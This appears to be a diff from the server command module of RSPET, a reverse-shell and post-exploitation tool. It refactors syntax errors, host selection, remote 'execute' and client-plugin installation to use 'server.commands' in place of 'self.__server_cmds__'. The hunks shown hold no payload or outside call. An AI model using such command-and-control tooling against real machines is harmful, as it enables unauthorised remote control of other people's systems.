@@ -14,7 +14,7 @@ def help(server, args):
     Help: [command]"""
     ret = [None, 0, ""]
     if len(args) > 1:
-        ret[2] = ("Syntax : %s" % self.__server_cmds__["help"].__syntax__)
+        ret[2] = ("Syntax : %s" % server.commands["help"].__syntax__)
         ret[1] = 1  # Invalid Syntax Error Code
     else:
         ret[2] = server.help(args)
@@ -66,7 +66,7 @@ def choose_host(server, args):
     Help: <host ID>"""
     ret = [None, 0, ""]
     if len(args) != 1 or not args[0].isdigit():
-        ret[2] = ("Syntax : %s" % self.__server_cmds__["choose_host"].__syntax__)
+        ret[2] = ("Syntax : %s" % server.commands["choose_host"].__syntax__)
         ret[1] = 1  # Invalid Syntax Error Code
     else:
         ret[1], ret[2] = server.select([args[0]])
@@ -81,7 +81,7 @@ def select(server, args):
     Help: <host ID> [host ID] [host ID] ..."""
     ret = [None, 0, ""]
     if len(args) == 0:
-        ret[2] = ("Syntax : %s" % self.__server_cmds__["select"].__syntax__)
+        ret[2] = ("Syntax : %s" % server.commands["select"].__syntax__)
         ret[1] = 1  # Invalid Syntax Error Code
     else:
         ret[1], ret[2] = server.select(args)
@@ -151,7 +151,7 @@ def execute(server, args):
     ret = [None, 0, ""]
     host = server.get_selected()[0]
     if len(args) == 0:
-        ret[2] = ("Syntax : %s" % self.__server_cmds__["execute"].__syntax__)
+        ret[2] = ("Syntax : %s" % server.commands["execute"].__syntax__)
         ret[1] = 1  # Invalid Syntax Error Code
     else:
         command = " ".join(args)
@@ -237,7 +237,7 @@ def client_install_plugin(server, args):
     Help: <plugin>"""
     ret = [None, 0, ""]
     if len(args) < 1:
-        ret[2] = ("Syntax : %s" % self.__server_cmds__["client_install_plugin"].__syntax__)
+        ret[2] = ("Syntax : %s" % server.commands["client_install_plugin"].__syntax__)
         ret[1] = 1  # Invalid Syntax Error Code
     else:
         cmd = args[0]  # Get plugin name
@@ -266,9 +266,9 @@ def plugin_command(server, args):
     Help: <command> [args]"""
     ret = [None, 0, ""]
     if len(args) < 1:
-        ret[2] = ("Syntax : %s" % self.__server_cmds__["plugin_command"].__syntax__)
+        ret[2] = ("Syntax : %s" % server.commands["plugin_command"].__syntax__)
         ret[1] = 1  # Invalid Syntax Error Code
-    elif args[0] not in self.__server_cmds__:
+    elif args[0] not in server.commands:
         ret[2] = ("Run 'Load_Plugin' first to load local handler.")
     else:
         cmd = args[0]  # Read command from args
@@ -292,7 +292,7 @@ def plugin_command(server, args):
                 #     host.send(arg) # Send argument
 
                 # Call local handler and pass remaining args
-                res = self.__server_cmds__[cmd](server, host, args)
+                res = server.commands[cmd](server, host, args)
                 ret[2] += res[2]
                 if res[0] is not None:
                     ret[0] = res[0]
@@ -334,11 +334,11 @@ def get_client_plugins(server, args):
     Help: <plugin> [plugin] [plugin] ..."""
     ret = [None, 0, ""]
     if len(args) < 1:
-        ret[2] = ("Syntax : %s" % self.__server_cmds__["get_client_plugins"].__syntax__)
+        ret[2] = ("Syntax : %s" % server.commands["get_client_plugins"].__syntax__)
         ret[1] = 1  # Invalid Syntax Error Code
     else:
         # Force client plugin list refresh.
-        self.available_client_plugins(server, args)
+        server.available_client_plugins(server, args)
         avail_plug = server.plugins["available_client"]
         for plugin in args:
             try:
@@ -362,7 +362,7 @@ def get_client_plugins(server, args):
                     with open(("/etc/rspet/plugins/Clinet/%s.client" % plugin), 'w') as plugin_file:
                         plugin_file.write(plugin_cont_cl)
                     ret[2] += ("%s: Clinet plugin installed." % plugin)
-                    self._log("DEBUG", "%s: Clinet plugin installed" % plugin)
+                    server._log("DEBUG", "%s: Clinet plugin installed" % plugin)
     return ret
 
 
